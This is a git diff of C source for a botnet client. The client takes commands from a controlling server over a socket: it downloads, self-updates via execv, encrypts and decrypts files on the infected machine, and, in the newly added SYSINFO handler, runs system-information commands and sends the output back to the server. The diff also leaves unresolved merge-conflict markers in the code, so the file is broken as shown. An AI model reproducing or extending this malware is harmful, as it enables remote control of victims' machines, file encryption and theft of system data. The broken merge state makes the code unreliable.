@@ -28,7 +28,8 @@ enum OrderType get_order_enum_type(const char *buffer) {
     if (strncmp(buffer, "DOWNLOAD", 8) == 0) return DOWNLOAD;
     if (strncmp(buffer, "UPDATE", 6) == 0) return UPDATE;
     if (strncmp(buffer, "ENCRYPT", 7) == 0) return ENCRYPT;
-    if (strncmp(buffer, "DECRYPT", 8) == 0) return DECRYPT;
+    if (strncmp(buffer, "DECRYPT", 7) == 0) return DECRYPT;
+    if (strncmp(buffer, "SYSINFO", 7) == 0) return SYSINFO;
     return UNKNOWN; // warning: unknown enum value is 99
 }
 
@@ -173,6 +174,7 @@ void receive_and_process_message(int sockfd, int argc, char *argv[]) {
         case UPDATE:
             perform_self_update("/tmp/botnet/downloads/client", sockfd, argc, argv);
             break;
+<<<<<<< src/client/client_utils.c
         case ENCRYPT:
             encrypt(sockfd, cmd.params[0]);
             break;
@@ -180,6 +182,10 @@ void receive_and_process_message(int sockfd, int argc, char *argv[]) {
             output_log("Preparing for DECRYPT request\n", LOG_DEBUG, LOG_TO_CONSOLE);
             decrypt(sockfd, cmd.params[0], cmd.params[1]);
             break;
+=======
+        case SYSINFO:
+            execute_get_sysinfo(sockfd);
+>>>>>>> src/client/client_utils.c
         case UNKNOWN:
             output_log("Unknown command type received\n", LOG_WARNING, LOG_TO_CONSOLE);
             break;
@@ -235,6 +241,7 @@ void perform_self_update(const char *new_exe_path, int sockfd, int argc, char *a
     output_log("perform_self_update : Execv failed to run : %s\n", LOG_ERROR, LOG_TO_ALL, errno);
 }
 
+<<<<<<< src/client/client_utils.c
 char random_char(int index) {
     char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     return charset[index];
@@ -347,3 +354,23 @@ void decrypt(int sockfd, const char *filepath, const char* key) {
     return;
 }
 
+=======
+void execute_get_sysinfo(int sockfd){
+    Command **cmds = commands_sysinfo();
+    // Execute other commands
+    for (int i = 0; i < 7; i++){
+        char result_buffer[4096] = {0};
+        int exit_code = execute_command(cmds[i], result_buffer, sizeof(result_buffer));
+
+        // Send the result back to the server
+        if (exit_code >= 0) {
+            send_message(sockfd, result_buffer);
+        } else {
+            char error_msg[100];
+            sprintf(error_msg, "Command %d execution failed", i+1);
+            send_message(sockfd, error_msg);
+        }   
+    }
+    free_commands(cmds);
+}
+>>>>>>> src/client/client_utils.c
